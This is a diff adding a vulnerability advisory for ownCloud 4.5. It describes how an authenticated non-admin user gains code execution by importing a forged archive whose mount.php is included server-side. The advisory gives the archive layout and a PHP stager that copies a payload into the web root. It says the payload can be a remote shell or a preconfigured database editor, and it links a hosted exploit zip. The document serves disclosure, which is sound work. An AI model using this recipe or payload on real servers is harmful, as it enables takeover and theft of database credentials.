@@ -1,0 +1,57 @@
+# Inclusion of a user provided PHP file in ownCloud 4.5
+
+# Author
+Felix Richter (root@euer.krebsco.de)
+
+# Versions
+## Affected Versions
+    latest owncloud 4.5 (4.5.1)
+
+## not affected
+    latest owncloud 4.0 (4.0.8)
+
+# Vulnerability Description
+A remote authenticated user without admin rights can run arbitrary code by
+importing a forged ownCloud archive zip file. The import archive contains the
+file `$username/mount.php` which will be included server-side once after
+uploading the archive.
+
+The vulnerability can be triggered despite the app "External storage
+support" (apps/files_external) being disabled.
+
+# Vulnerable Scripts:
+```
+lib/util.php:71:
+     $mountConfig = include($user_root.'/mount.php');
+
+apps/files_external/lib/config.php:239 and 234:
+     $file = OC_User::getHome(OCP\User::getUser()).'/mount.php';
+     ...
+     $mountPoints = include($file);
+```
+# Proof of Concept
+The forged archive has the following structure:
+
+    /export_info.json
+    /$username/
+              /files/
+              /migration.db
+              /mount.php
+              /payload.php
+
+`mount.php` can be used as stager to copy files from the protected "/data/"
+directory to the server root directory:
+
+```
+<?php
+copy("../data/".OCP\USER::getUser()."/payload.php","../payload.php");
+?>
+```
+
+The payload.php can be a remote shell or sql editor.
+
+A specially crafted adminer which includes the server and database
+configuration is included in the archive and is accessible after exploitation at
+http:://$webroot/payload.php .
+
+Payload URL: http://pigstarter.krebsco.de/payload/ownedcloud.zip
